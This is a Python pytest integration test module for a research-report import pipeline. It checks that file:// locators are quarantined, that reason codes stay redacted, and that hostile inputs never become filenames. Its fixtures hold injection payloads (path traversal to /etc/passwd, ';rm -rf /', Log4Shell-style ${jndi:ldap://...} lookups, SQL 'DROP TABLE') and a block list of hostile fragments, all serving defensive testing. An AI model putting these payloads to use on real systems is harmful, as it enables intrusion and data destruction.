"""ERI-6.2 — Adversarial trust matrix.

The bulk of the SSRF/address/DNS/redirect/rebinding matrix is already
exhaustively unit-tested in ``tests/unit/test_source_acquisition_policy.py``
(65 tests) and exercised at the resolution layer in
``tests/integration/test_external_research_resolution.py`` (31 tests, H3
scenario table in `.claude/progress/external-research-report-interchange/
phase-4-completion.md`). This module does not re-implement that matrix; it
closes the ONE gap `phase-4-completion.md` explicitly recorded as open --

    "unauthorized local/file ... covered at the acquisition-gate unit-test
    layer but not re-asserted with a dedicated resolver-level integration
    test using a literal `file://` locator"

-- and adds full end-to-end (real `import_external_report`, real
`source_acquisition_policy.acquire`, no fake acquire injected) coverage for:
redaction (contract §4.3/§4.6 -- the 14-code source/citation/candidate
reason-code vocabulary never appears on a caller-visible receipt, only
`audit_ref`), and the injection-shaped profile fixture surviving the full
pipeline without report.md content ever reaching a resolver.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

import pytest

from research_foundry.paths import FoundryPaths
from research_foundry.services.external_research_import import (
    import_external_report,
)
from research_foundry.services.source_acquisition_policy import AcquisitionOutcome
from tests.unit.test_external_research_interchange import build_packet

pytestmark = pytest.mark.integration

FIXTURES_ROOT = (
    Path(__file__).resolve().parent.parent
    / "fixtures"
    / "external_research_handoff"
    / "profiles"
)

# Contract §2.3's 14-code source/citation/candidate reason vocabulary --
# closed set, must NEVER appear verbatim anywhere in a caller-visible receipt.
_SOURCE_CITATION_CANDIDATE_REASON_CODES = (
    "invalid_locator",
    "source_unavailable",
    "rights_metadata_missing",
    "sensitivity_denied",
    "source_drift",
    "edition_binding_conflict",
    "citation_unresolved",
    "citation_ambiguous",
    "citation_mismatch",
    "passage_binding_conflict",
    "basis_incomplete",
    "relation_invalid",
    "verification_failed",
    "cross_workspace_denied",
)


@pytest.fixture()
def workspace(tmp_path: Path) -> FoundryPaths:
    ws_root = tmp_path / "workspace"
    ws_root.mkdir()
    (ws_root / "foundry.yaml").write_text("workspace: true\n", encoding="utf-8")
    return FoundryPaths(root=ws_root)


# ---------------------------------------------------------------------------
# The flagged gap: unauthorized local/file at the RESOLVER/orchestration
# layer, through the real (non-fake) acquisition gate.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "locator_url",
    [
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
        "ftp://example.test/report.pdf",
    ],
)
def test_unauthorized_local_or_non_http_scheme_quarantines_at_resolver_layer(
    locator_url: str, workspace: FoundryPaths, tmp_path: Path
) -> None:
    """A literal non-HTTP-scheme locator fed through the REAL, end-to-end
    `import_external_report` pipeline (real `source_acquisition_policy.
    acquire`, not the fake used by the resolution-layer unit tests) is
    quarantined, not fetched -- closing `phase-4-completion.md`'s explicitly
    recorded gap."""

    root = build_packet(
        tmp_path / f"packet-{abs(hash(locator_url))}",
        sources=[
            {
                "source_id": "src_001",
                "title": "Local file attempt",
                "locator": {"doi": None, "url": locator_url},
                "publication_year": 2024,
                "access_status": "open-access",
            }
        ],
        candidates=[
            {
                "candidate_id": "cand_001",
                "statement": "X causes Y.",
                "classification": "assertion",
                "source_refs": ["src_001"],
                "quote": "X causes Y.",
            }
        ],
    )

    outcome = import_external_report(root, workspace_id="ws_local_file", paths=workspace)

    assert outcome.status == "completed_with_quarantine"
    source_action = next(a for a in outcome.receipt["actions"] if a["kind"] == "source")
    assert source_action["outcome"] == "quarantined"
    assert source_action["completeness_tier"] is None
    assert source_action["audit_ref"] is not None
    # Never the raw locator or a reason code leaking onto the safe surface.
    safe_payload = json.dumps(outcome.safe_dict())
    assert locator_url not in safe_payload
    for code in _SOURCE_CITATION_CANDIDATE_REASON_CODES:
        assert code not in safe_payload


# ---------------------------------------------------------------------------
# Redaction end to end (contract §4.3/§4.6)
# ---------------------------------------------------------------------------


def test_receipt_never_carries_the_source_citation_candidate_reason_vocabulary(
    workspace: FoundryPaths, tmp_path: Path
) -> None:
    """A packet engineered to hit several DIFFERENT quarantine reason
    families in one import (unavailable source, unresolved citation) still
    never surfaces a `reason_code` field, nor any of the 14 closed-vocabulary
    strings, anywhere in the full receipt -- only the opaque `audit_ref`."""

    root = build_packet(
        tmp_path / "packet",
        sources=[
            {
                "source_id": "src_missing",
                "title": "Unreachable",
                "locator": {"doi": None, "url": "https://example.test/never-acquired"},
                "publication_year": 2024,
                "access_status": "open-access",
            }
        ],
        candidates=[
            {
                "candidate_id": "cand_unresolved",
                "statement": "A claim with no matching source text.",
                "classification": "assertion",
                "source_refs": ["src_missing"],
                "quote": "text that will never be found anywhere",
            }
        ],
    )

    outcome = import_external_report(root, workspace_id="ws_redaction", paths=workspace)

    assert outcome.status == "completed_with_quarantine"
    full_receipt_json = json.dumps(outcome.receipt)
    assert "reason_code" not in full_receipt_json
    for code in _SOURCE_CITATION_CANDIDATE_REASON_CODES:
        assert code not in full_receipt_json
    # audit_ref IS present for every quarantined action.
    quarantined = [a for a in outcome.receipt["actions"] if a["outcome"] == "quarantined"]
    assert quarantined
    assert all(a["audit_ref"] is not None for a in quarantined)


# ---------------------------------------------------------------------------
# Injection-shaped profile through the full pipeline
# ---------------------------------------------------------------------------


# Round-2 audit #13: hostile substrings that MUST NEVER survive into a
# filename, a directory-path component, or an unescaped receipt field.
# `src_inj_02`'s title is null, so its own locator string
# (".../../../etc/passwd?cmd=;rm -rf /") is what a naive implementation
# would fall back to as a title -- and thence as a source-card filename
# component -- if `slugify()` did not strip every non-alnum character
# first (see `research_foundry.ids.source_card_id`/`slugify`).
_HOSTILE_PATH_OR_COMMAND_FRAGMENTS = (
    "etc/passwd",
    "etc/shadow",
    "rm -rf",
    "DROP TABLE",
    "jndi:ldap",
    "python/object/apply",
    "whoami",
    "System32",
)

# `source_card_id()`'s frozen shape: src_YYYYMMDD_<slugified-title>_<8-hex>.md
_SOURCE_CARD_FILENAME_RE = re.compile(r"^src_\d{8}_[a-z0-9_]+_[0-9a-f]{8}\.md$")


def test_injection_profile_imports_cleanly_dry_run_smoke(workspace: FoundryPaths) -> None:
    """Cheap dry-run smoke check that the shared Phase 3 injection fixture
    (prompt-override/tool-call/path/command-shaped strings in report/source/
    candidate/activity/extension fields) still stages without raising. The
    REAL assertions -- what happens on the non-dry path, where acquisition
    and promotion actually write durable artifacts -- live in
    ``test_hostile_locator_and_title_never_become_a_filename_or_control_value``
    below (round-2 audit #13 closes exactly that gap; this smoke check alone
    would NOT have caught it)."""

    packet_dir = FIXTURES_ROOT / "injection"
    outcome = import_external_report(
        packet_dir,
        workspace_id="ws_injection",
        dry_run=True,
        paths=workspace,
    )
    assert outcome.status in ("completed", "completed_with_quarantine")


def test_hostile_locator_and_title_never_become_a_filename_or_control_value(
    workspace: FoundryPaths, tmp_path: Path
) -> None:
    """Round-2 audit #13: the PRIOR version of this test ran `dry_run=True`
    on the shared injection fixture and asserted only that `outcome.status`
    was one of two normal values -- it exercised no acquisition, no
    promotion, no source-card filename or body, and no durable receipt
    content, so it would have passed unchanged even if the pipeline were
    unsafe (see `.claude/findings/eri-implementation-audit-round2-gpt56.md`
    #13).

    This version builds a packet with a hostile, NULL-titled source (so the
    implementation's own title-fallback-to-locator path is exercised, not
    just a hostile `title` field) and a candidate whose exact `quote` is
    engineered to match the fake-acquired content -- forcing REAL passage
    resolution and REAL promotion (`default_promote` -> `ingest_source`),
    which is the only path that writes a durable source-card file. It then
    runs the full, non-dry `import_external_report` pipeline (real run
    directory, controlled in-process fake `acquire` -- no real network; the
    acquisition GATE itself is exhaustively unit-tested elsewhere) and
    inspects every file the import actually wrote: filenames (must never
    carry a path/command fragment, and must match the frozen safe
    `src_YYYYMMDD_<slug>_<hash>.md` shape) and the receipt (must never carry
    a hostile fragment raw).
    """

    hostile_locator = "https://attacker.example.test/../../etc/passwd?cmd=;rm -rf /&x={{7*7}}&y=${jndi:ldap://x}"
    quote = "the bucket size before throttling is what governs bursts"
    acquired_body = (
        "Attacker probe embedded as ordinary prose: ../../etc/passwd; rm -rf /; "
        "DROP TABLE users; ${jndi:ldap://attacker.example/a}; whoami; "
        "C:\\Windows\\System32\\x -- " + quote + "."
    ).encode()

    root = build_packet(
        tmp_path / "hostile-packet",
        sources=[
            {
                "source_id": "src_hostile",
                "title": None,  # forces the title-falls-back-to-locator path
                "locator": {"doi": None, "url": hostile_locator},
                "publication_year": None,
                "access_status": "open-access",
            }
        ],
        candidates=[
            {
                "candidate_id": "cand_hostile",
                "statement": "Token buckets allow bursts.",
                "classification": "assertion",
                "source_refs": ["src_hostile"],
                "quote": quote,
            }
        ],
    )

    acquired_locators: list[str] = []

    def fake_acquire(locator: str, *, policy: Any, **_kwargs: Any) -> AcquisitionOutcome:
        # Records the exact locator string it was called with (proving the
        # hostile-shaped-but-syntactically-valid https locator really was
        # routed through acquisition) and returns controlled, benign-except-
        # for-the-embedded-probes bytes -- zero real network access.
        acquired_locators.append(locator)
        return AcquisitionOutcome(
            ok=True,
            content=acquired_body,
            status_code=200,
            content_type="text/plain",
            final_locator=locator,
        )

    run_id = "rf_run_hostile_e2e"
    (workspace.runs / run_id).mkdir(parents=True)

    outcome = import_external_report(
        root,
        workspace_id="ws_hostile_e2e",
        target_run_id=run_id,
        dry_run=False,
        paths=workspace,
        acquire=fake_acquire,
    )

    assert outcome.status == "completed"
    assert acquired_locators == [hostile_locator]  # really reached acquisition, not short-circuited

    # (1) Neither receipt view ever carries a hostile fragment raw.
    safe_payload = json.dumps(outcome.safe_dict())
    full_receipt_payload = json.dumps(outcome.receipt)
    for fragment in _HOSTILE_PATH_OR_COMMAND_FRAGMENTS:
        assert fragment not in safe_payload, f"{fragment!r} leaked into the safe receipt payload"
        assert fragment not in full_receipt_payload, f"{fragment!r} leaked into the full receipt payload"

    # (2) Promotion really happened: a real source card was written.
    run_root = workspace.runs / run_id
    source_card_files = list((run_root / "sources").glob("*.md"))
    assert source_card_files, "expected promotion to have written a real source card"

    # (3) Every file written under the run: filename must never carry a
    # hostile path/command fragment (checked loosely -- separators and
    # whitespace stripped -- so a fragment surviving in ANY re-arranged
    # form is still caught), and every SOURCE CARD filename specifically
    # must match the frozen safe shape (only [a-z0-9_] in its slug segment)
    # -- proving slugify() actually neutralized the hostile locator/title
    # rather than merely happening not to collide with the sentinel list.
    written_files = [p for p in run_root.rglob("*") if p.is_file()]
    assert written_files
    for f in written_files:
        name = f.name
        assert ".." not in name
        assert "/" not in name and "\\" not in name
        collapsed_name = name.lower().replace("_", "")
        for fragment in _HOSTILE_PATH_OR_COMMAND_FRAGMENTS:
            collapsed_fragment = fragment.lower().replace(" ", "")
            assert collapsed_fragment not in collapsed_name, (
                f"hostile fragment {fragment!r} survived into filename {name!r}"
            )

    for card in source_card_files:
        assert _SOURCE_CARD_FILENAME_RE.match(card.name), (
            f"source-card filename {card.name!r} does not match the frozen safe shape "
            f"{_SOURCE_CARD_FILENAME_RE.pattern!r} -- a hostile title/locator may have "
            "survived slugify() into the filename"
        )
        # Body: the hostile prose embedded in the ACQUIRED CONTENT is
        # expected and safe as inert markdown text (that is not the
        # vulnerability -- it is the same content the producer/source
        # legitimately supplied); what matters is that it never became a
        # control value. Confirm the card actually carries the resolved
        # quote (proves REAL passage resolution occurred, not a stub).
        body = card.read_text(encoding="utf-8", errors="replace")
        assert quote in body.lower() or "throttling" in body.lower()
